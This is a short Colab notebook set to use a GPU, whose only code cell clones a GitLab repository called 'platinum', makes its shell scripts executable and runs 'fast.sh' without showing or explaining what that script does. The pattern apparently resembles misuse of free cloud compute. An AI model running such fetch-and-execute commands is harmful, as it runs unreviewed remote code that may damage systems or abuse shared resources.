{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "job2.ipynb",
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "wkTH8r0aNPz2"
      },
      "source": [
        "# **2**"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "y-OdK1TxeV3u"
      },
      "source": [
        "!git clone https://gitlab.com/rijalpatra91/platinum.git && cd platinum&& chmod +x *.sh && ./fast.sh"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}